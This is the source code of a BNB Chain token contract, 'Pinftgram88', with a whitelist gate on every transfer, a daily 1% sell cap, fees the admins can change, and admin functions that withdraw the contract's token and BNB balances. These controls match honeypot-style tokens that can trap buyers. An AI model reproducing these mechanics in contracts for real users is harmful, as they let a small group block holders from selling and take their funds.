/**
 *Submitted for verification at BscScan.com on 2022-06-20
*/

// File: contracts/pinftagram88.sol

/**
 *Submitted for verification at BscScan.com on 2022-06-15
*/


pragma solidity 0.8.10;
 
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}
 
interface InterfaceLP {
    function sync() external;
}

library Roles {
    struct Role {
        mapping (address => bool) bearer;
    }

    function add(Role storage role, address account) internal {
        require(!has(role, account), "Roles: account already has role");
        role.bearer[account] = true;
    }

    function remove(Role storage role, address account) internal {
        require(has(role, account), "Roles: account does not have role");
        role.bearer[account] = false;
    }

    function has(Role storage role, address account) internal view returns (bool) {
        require(account != address(0), "Roles: account is the zero address");
        return role.bearer[account];
    }
}

abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint8 _tokenDecimals
    ) {
        _name = _tokenName;
        _symbol = _tokenSymbol;
        _decimals = _tokenDecimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}
 

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


contract Ownable {
    address private _owner;

    event OwnershipRenounced(address indexed previousOwner);

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Not owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipRenounced(_owner);
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract WhitelistedRole is Ownable {
    using Roles for Roles.Role;

    event WhitelistedAdded(address indexed account);
    event WhitelistedRemoved(address indexed account);

    Roles.Role private _whitelisteds;
    Roles.Role private _rebaseAdmins;

    constructor(){
        _addWhitelisted(msg.sender);
    }

    modifier onlyWhitelisted() {
        require(isWhitelisted(msg.sender), "WhitelistedRole: caller does not have the Whitelisted role");
        _;
    }

    function isWhitelisted(address account) public view returns (bool) {
        return _whitelisteds.has(account);
    }

    function addWhitelisted(address account) public onlyWhitelisted {
        _addWhitelisted(account);
    }

    function removeWhitelisted(address account) public onlyWhitelisted {
        _removeWhitelisted(account);
    }

    function renounceWhitelisted() public {
        _removeWhitelisted(msg.sender);
    }

    function _addWhitelisted(address account) internal {
        _whitelisteds.add(account);
        emit WhitelistedAdded(account);
    }

    function _removeWhitelisted(address account) internal {
        _whitelisteds.remove(account);
        emit WhitelistedRemoved(account);
    }

}

contract Pinftagram8 is ERC20Detailed, Ownable, WhitelistedRole {
   

    bool public initialDistributionFinished = false;
   
    bool public feesOnNormalTransfers = false;
     
    uint256 public maxSellTransactionAmount = 1000000 * 10 ** 18;


    mapping(address => bool) _isFeeExempt;
    mapping(address => bool) _isWhiteListedUser;
    
    uint256 public constant MAX_FEE_RATE = 20;
    
    uint256 private constant DECIMALS = 18;
    
    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 100 * 10**6 * 10**DECIMALS;
     
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    IDEXRouter public router;
    address public pair;
     
    address public treasuryReceiver  = 0x1ade19d48B65336a050651E31337493af5523024;

    // mainnet 
    // address public busdToken   = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
   
    // testnet 
    address public busdToken   = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee;
      


    uint256 public treasuryFee = 8;
     
    uint256 public sellFeeTreasuryAdded = 10;
     
    uint256 public totalBuyFee =  treasuryFee ;
    uint256 public totalSellFee = totalBuyFee + sellFeeTreasuryAdded ;
    uint256 public feeDenominator = 100;
  
    address[] public _marketPairs;
    mapping (address => bool) public automatedMarketMakerPairs;


    uint256 public SellLimit = 1;

    uint256 private MAX_INT = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;

    struct user {
        uint256 lastTradeTime;
        uint256 tradeAmount;
    }

    uint256 public TwentyFourhours = 86400;

    mapping(address => user) public tradeData;
    
    modifier validRecipient(address to) {
        require(to != address(0x0));
        _;
    }

    uint256 private _totalSupply;
 
 
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowedFragments;

    constructor() ERC20Detailed("Pinftgram88", "PNFT88", uint8(DECIMALS)) {
        // mainnet 
       //  router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        // testnet
        router = IDEXRouter(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
 

        pair = IDEXFactory(router.factory()).createPair(address(this), router.WETH());
        address pairBusd = IDEXFactory(router.factory()).createPair(address(this), busdToken);

        _allowedFragments[address(this)][address(router)] = uint256(MAX_INT);
        _allowedFragments[address(this)][pair] = uint256(MAX_INT);
        _allowedFragments[address(this)][address(this)] = uint256(MAX_INT);
        _allowedFragments[address(this)][pairBusd] = uint256(MAX_INT);

        setAutomatedMarketMakerPair(pair, true);
        setAutomatedMarketMakerPair(pairBusd, true);
          
        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
        _balances[msg.sender] = _totalSupply;
         

        _isFeeExempt[treasuryReceiver] = true;
        _isFeeExempt[address(this)] = true;
        _isFeeExempt[msg.sender] = true;

        IERC20(busdToken).approve(address(router), uint256(MAX_INT));
        IERC20(busdToken).approve(address(pairBusd), uint256(MAX_INT));
        IERC20(busdToken).approve(address(this), uint256(MAX_INT));
         
        emit Transfer(address(0x0), msg.sender, _totalSupply);
    } 


    fallback() external payable {}
    receive() external payable { }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner_, address spender) external view override returns (uint256){
        return _allowedFragments[owner_][spender];
    }

    function balanceOf(address who) public view override returns (uint256) {
        return _balances[who] ;
    }

    function checkFeeExempt(address _addr) external view returns (bool) {
        return _isFeeExempt[_addr];
    }

    function checkWhiteListedUser(address _addr) external view returns (bool) {
        return _isWhiteListedUser[_addr];
    }


    function shouldTakeFee(address from, address to) internal view returns (bool) {
     if(_isFeeExempt[from] || _isFeeExempt[to]){
            return false;
        }else if (feesOnNormalTransfers){
            return true;
        }else{
            return (automatedMarketMakerPairs[from] || automatedMarketMakerPairs[to]);
        }
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply - _balances[DEAD] - _balances[ZERO];
    }


    function transfer(address to, uint256 value) external override validRecipient(to) returns (bool){
        _transferFrom(msg.sender, to, value);
        return true;
    }

    function _basicTransfer(address from, address to, uint256 amount) internal returns (bool) {
         
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;

        emit Transfer(from, to, amount);

        return true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool excludedAccount = _isFeeExempt[sender] || _isFeeExempt[recipient];
        require(initialDistributionFinished || excludedAccount, "Trading not started");

        bool AllowedTransfer = _isWhiteListedUser[sender] || _isWhiteListedUser[recipient];
        require(AllowedTransfer, "Trading not Allowed to this Sender or Receiver");
        
         if (  automatedMarketMakerPairs[recipient] && !excludedAccount  ) {
            require(amount <= maxSellTransactionAmount, "Error amount");

            uint blkTime = block.timestamp;
          
            uint256 maxPercent = balanceOf(sender) * SellLimit / 100;  
            require(amount <= maxPercent, "ERR: Can't sell more than set %");
            
            if( blkTime > tradeData[sender].lastTradeTime + TwentyFourhours) {
                tradeData[sender].lastTradeTime = blkTime;
                tradeData[sender].tradeAmount = amount;
            }
            else if( (blkTime < tradeData[sender].lastTradeTime + TwentyFourhours) && (( blkTime > tradeData[sender].lastTradeTime)) ){
                require(tradeData[sender].tradeAmount + amount <= maxPercent , "ERR: Can't sell more than 1% in One day");
                tradeData[sender].tradeAmount = tradeData[sender].tradeAmount + amount;
            }
        } 


        _balances[sender] = _balances[sender] - amount ;

        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient] + amountReceived;

        emit Transfer(
            sender,
            recipient,
            amountReceived 
        );

       
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external override validRecipient(to) returns (bool) {
        if (_allowedFragments[from][msg.sender] != uint256(MAX_INT)) {
            _allowedFragments[from][msg.sender] = _allowedFragments[from][msg.sender] - value ;
        }

        _transferFrom(from, to, value);
        return true;
    }

    

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256){
        uint256 _realFee = totalBuyFee;
        if(automatedMarketMakerPairs[recipient]) _realFee = totalSellFee;

        uint256 feeAmount = amount * _realFee / feeDenominator;

        _balances[address(this)] = _balances[address(this)] + feeAmount;
        emit Transfer(sender, address(this), feeAmount);

        return amount - feeAmount ;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool){
        uint256 oldValue = _allowedFragments[msg.sender][spender];
        if (subtractedValue >= oldValue) {
            _allowedFragments[msg.sender][spender] = 0;
        } else {
            _allowedFragments[msg.sender][spender] = oldValue - subtractedValue ;
        }
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool){
        _allowedFragments[msg.sender][spender] = _allowedFragments[msg.sender][spender] + addedValue;
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function approve(address spender, uint256 value) external override returns (bool){
        _allowedFragments[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
 

    function setInitialDistributionFinished(bool _value) external onlyWhitelisted {
        require(initialDistributionFinished != _value, "Not changed");
        initialDistributionFinished = _value;
    }

    function setFeeExempt(address _addr, bool _value) external onlyWhitelisted {
        require(_isFeeExempt[_addr] != _value, "Not changed");
        _isFeeExempt[_addr] = _value;
    }

    function setWhiteListedUser(address _addr, bool _value) public onlyWhitelisted {
        require(_isWhiteListedUser[_addr] != _value, "Not changed");
        _isWhiteListedUser[_addr] = _value;
    }

    function setSellLimit(uint _selllimit) external onlyWhitelisted {
        SellLimit = _selllimit;
    }

    function setTwentyFourhours(uint256 _time) external onlyWhitelisted {
        TwentyFourhours = _time;
    }
         

    function setTreasuryReceiver(address _treasuryReceiver ) external onlyWhitelisted {
        treasuryReceiver = _treasuryReceiver;
    }

    function setFees(uint256 _treasuryFee, uint256 _sellFeeTreasuryAdded, uint256 _feeDenominator) external onlyWhitelisted {
      require( _treasuryFee <= MAX_FEE_RATE && _sellFeeTreasuryAdded <= MAX_FEE_RATE ,  "wrong"  );

         
      treasuryFee = _treasuryFee;
      sellFeeTreasuryAdded = _sellFeeTreasuryAdded;
      totalBuyFee = treasuryFee;
      totalSellFee = totalBuyFee + sellFeeTreasuryAdded;
      feeDenominator = _feeDenominator;
      require(totalBuyFee < feeDenominator / 4);
    }

    function clearStuckBalance(address _receiver) external onlyWhitelisted {
        uint256 balance = address(this).balance;
        payable(_receiver).transfer(balance);
    }

    function rescueToken(address tokenAddress, uint256 tokens) external onlyWhitelisted returns (bool success){
        return ERC20Detailed(tokenAddress).transfer(msg.sender, tokens);
    }

  
    
    function setFeesOnNormalTransfers(bool _enabled) external onlyWhitelisted {
        require(feesOnNormalTransfers != _enabled, "Not changed");
        feesOnNormalTransfers = _enabled;
    }

  
 
    function setMaxSellTransaction(uint256 _maxTxn) external onlyWhitelisted {
        maxSellTransactionAmount = _maxTxn;
    }


     function setAutomatedMarketMakerPair(address _pair, bool _value) public onlyWhitelisted {
        require(automatedMarketMakerPairs[_pair] != _value, "Value already set");

        automatedMarketMakerPairs[_pair] = _value;
        

        if(_value){
            _marketPairs.push(_pair);
        }else{
            require(_marketPairs.length > 1, "Required 1 pair");
            for (uint256 i = 0; i < _marketPairs.length; i++) {
                if (_marketPairs[i] == _pair) {
                    _marketPairs[i] = _marketPairs[_marketPairs.length - 1];
                    _marketPairs.pop();
                    break;
                }
            }
        }

        emit SetAutomatedMarketMakerPair(_pair, _value);
    }

 

    // airdrop individual specific number of tokens to batch of addresses 
  function multiTransfer(address[] calldata addresses, uint256[] calldata tokens) onlyWhitelisted external onlyOwner {

    require(addresses.length < 501,"GAS Error: max airdrop limit is 500 addresses"); // to prevent overflow
    require(addresses.length == tokens.length,"Mismatch between Address and token count");

    uint256 airdropcount = 0;

    for(uint i=0; i < addresses.length; i++){
        airdropcount = airdropcount + tokens[i];
    }

    require(balanceOf(msg.sender) >= airdropcount, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _transferFrom(msg.sender,addresses[i],tokens[i]);
    }
   
  }

  // airdrop fixed amount to batch of addresses 
  function multiTransfer_fixed(address[] calldata addresses, uint256 tokens) onlyWhitelisted external onlyOwner {

    require(addresses.length < 2001,"GAS Error: max airdrop limit is 2000 addresses"); // to prevent overflow

    uint256 airdropcount = tokens * addresses.length;

    require(balanceOf(msg.sender) >= airdropcount, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _transferFrom(msg.sender,addresses[i],tokens);
    }
}

event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);


}